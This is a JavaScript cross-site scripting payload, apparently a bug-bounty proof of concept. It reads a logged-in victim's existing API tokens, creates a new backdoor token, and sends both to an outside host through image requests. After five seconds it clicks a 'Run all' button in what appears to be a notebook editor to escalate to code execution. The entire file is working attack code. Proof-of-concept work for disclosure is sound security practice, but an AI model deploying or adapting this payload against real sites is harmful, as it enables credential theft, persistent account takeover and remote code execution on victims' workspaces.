(async function() {
    const EXFIL = 'https://poc.heli9.com/jet/log.php';
    
    function exfil(type, data) {
        const payload = btoa(JSON.stringify({
            type: type,
            data: data,
            timestamp: new Date().toISOString(),
            domain: document.domain
        }));
        new Image().src = EXFIL + '?type=' + encodeURIComponent(type) + 
                          '&d=' + encodeURIComponent(payload.slice(0, 2000));
    }
    
    exfil('xss_executed', { domain: document.domain, url: location.href });
    
    try {
        const resp = await fetch('/api/user_management/v1/api-tokens/list', {
            credentials: 'include'
        });
        if (resp.ok) {
            const tokens = await resp.json();
            exfil('stolen_existing_tokens', tokens);
        }
    } catch(e) {}
    
    try {
        const resp = await fetch('/api/user_management/v1/api-tokens/create', {
            method: 'POST',
            credentials: 'include'
        });
        if (resp.ok) {
            const newToken = await resp.json();
            exfil('backdoor_token_created', newToken);
        }
    } catch(e) {}
    
    function triggerRunAll() {
        const runAllBtn = document.querySelector('.editor-header__run-all-button');
        if (runAllBtn) {
            runAllBtn.click();
            exfil('rce_triggered', { method: 'run_all_button_click', success: true });
            return;
        }
        const buttons = document.querySelectorAll('button');
        for (const btn of buttons) {
            if (btn.textContent.includes('Run all')) {
                btn.click();
                exfil('rce_triggered', { method: 'button_text_match', success: true });
                return;
            }
        }
        exfil('rce_trigger_failed', { message: 'Run all button not found' });
    }
    
    setTimeout(triggerRunAll, 5000);
    
    exfil('xss_complete', 'Exploitation complete');
    console.log('[POC] XSS executed on: ' + document.domain);
    
})();
